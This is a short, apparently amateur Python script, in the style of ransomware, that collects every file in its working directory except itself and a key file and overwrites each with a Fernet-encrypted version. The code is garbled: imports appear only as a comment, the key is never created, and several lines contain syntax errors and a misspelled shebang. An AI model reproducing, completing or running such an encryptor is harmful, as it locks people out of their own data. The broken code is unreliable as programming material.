#!/user/bin/env python3

#importing OS and fernet for 128-bit aes

files = []

#ignores the files we don't want to encrypt in this dir
for file in os.listdir():
	in files == "voldemoret.py" "theKey.key":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

#creating the key
with open("theKey.key","wb") as theKey:
	theKey.write(key)

#encrypting the files
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as the file:
		thefile.write(contents_encrypted)
